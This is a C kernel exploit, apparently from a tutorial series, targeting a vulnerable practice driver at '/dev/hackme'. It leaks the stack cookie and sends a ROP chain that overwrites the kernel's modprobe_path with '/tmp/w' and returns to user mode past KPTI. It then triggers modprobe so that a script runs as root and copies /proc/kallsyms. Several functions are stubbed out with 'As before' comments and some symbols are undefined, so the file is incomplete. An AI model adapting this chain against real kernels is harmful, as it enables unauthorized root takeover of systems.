#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define formatBool(b) ((b) ? "true" : "false")

char *VULN_DRV = "/dev/hackme";

int64_t global_fd;
uint64_t cookie;
uint8_t cookie_off;
uint64_t modprobe_path = 0xffffffff82061820;
uint64_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81200f10;
uint64_t pop_rdi_ret = 0xffffffff81006370;
uint64_t pop_rax_ret = 0xffffffff81004d11;
uint64_t write_rax_into_rdi_ret = 0xffffffff818673e9;

void open_dev(){
    // As before
};

void leak_cookie() {
  // As before
}

void save_state() {
  // Same as before
}

char *win_condition = "/tmp/w";
char *dummy_file = "/tmp/d";
char *res = "/tmp/syms";

struct stat st = {0};

const char *arb_exec = "#!/bin/sh\n"
                       "cat /proc/kallsyms > /tmp/syms\n"
                       "chmod 777 /tmp/syms";

void abuse_modprobe() {
  puts("[+] Hello from user land!");
  if (stat("/tmp", &st) == -1) {
    puts("[*] Creating /tmp");
    int ret = mkdir("/tmp", S_IRWXU);
    if (ret == -1) {
      puts("[!] Failed");
      exit(-1);
    }
  }

  puts("[*] Setting up reading '/proc/kallsyms' as non-root user...");
  FILE *fptr = fopen(win_condition, "w");
  if (!fptr) {
    puts("[!] Failed to open win condition");
    exit(-1);
  }

  if (fputs(arb_exec, fptr) == EOF) {
    puts("[!] Failed to write win condition");
    exit(-1);
  }

  fclose(fptr);

  if (chmod(win_condition, S_IXUSR) < 0) {
    puts("[!] Failed to chmod win condition");
    exit(-1);
  };
  puts("[+] Wrote win condition -> /tmp/w");

  fptr = fopen(dummy_file, "w");
  if (!fptr) {
    puts("[!] Failed to open dummy file");
    exit(-1);
  }

  puts("[*] Writing dummy file...");
  if (fputs("\x37\x13\x42\x42", fptr) == EOF) {
    puts("[!] Failed to write dummy file");
    exit(-1);
  }
  fclose(fptr);

  if (chmod(dummy_file, S_ISUID | S_IXUSR) < 0) {
    puts("[!] Failed to chmod win condition");
    exit(-1);
  };
  puts("[+] Wrote modprobe trigger -> /tmp/d");

  puts("[*] Triggering modprobe by executing /tmp/d");
  execv(dummy_file, NULL);

  puts("[?] Hopefully GG");

  fptr = fopen(res, "r");
  if (!fptr) {
    puts("[!] Failed to open results file");
    exit(-1);
  }
  char *line = NULL;
  size_t len = 0;
  for (int i = 0; i < 8; i++) {
    uint64_t read = getline(&line, &len, fptr);
    printf("%s", line);
  }

  fclose(fptr);
}

void exploit() {
  uint8_t sz = 35;
  uint64_t payload[sz];
  printf("[*] Attempting cookie (%#02llx) cookie overwrite at offset: %u.\n",
         cookie, cookie_off);
  payload[cookie_off++] = cookie;
  payload[cookie_off++] = 0x0;
  payload[cookie_off++] = 0x0;
  payload[cookie_off++] = 0x0;
  payload[cookie_off++] = pop_rax_ret;    // ret
  payload[cookie_off++] = 0x772f706d742f; // rax: /tmp/w == our win condition
  payload[cookie_off++] = pop_rdi_ret;
  payload[cookie_off++] = modprobe_path;          // rdi: modprobe_path
  payload[cookie_off++] = write_rax_into_rdi_ret; // modprobe_path -> /tmp/w
  payload[cookie_off++] =
      swapgs_restore_regs_and_return_to_usermode + 22; // KPTI
  payload[cookie_off++] = 0x0;
  payload[cookie_off++] = 0x0;
  payload[cookie_off++] = (uint64_t)abuse_modprobe; // return here
  payload[cookie_off++] = user_cs;
  payload[cookie_off++] = user_rflags;
  payload[cookie_off++] = user_sp;
  payload[cookie_off++] = user_ss;

  puts("[*] Firing payload");
  uint64_t data = write(global_fd, payload, sizeof(payload));
}

int main(int argc, char **argv) {
  register_sigsegv();
  open_dev();
  leak_cookie();
  save_state();
  exploit();
}
